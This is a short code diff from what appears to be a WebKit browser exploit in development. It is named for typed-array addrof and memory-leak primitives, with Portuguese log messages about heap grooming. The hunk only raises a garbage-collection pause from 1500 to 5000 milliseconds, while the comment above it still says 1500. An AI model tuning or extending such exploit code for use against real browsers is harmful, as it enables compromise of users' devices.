@@ -258,7 +258,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
             // <-- MUDANÇA: Pausa do GC reduzida de 10000ms para 1500ms para diminuir a agressividade e evitar crash fatal.
-            await PAUSE_S3(1500);
+            await PAUSE_S3(5000);
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
         };
          if (testes_ativos.tentativa_5_ClassInfo) {
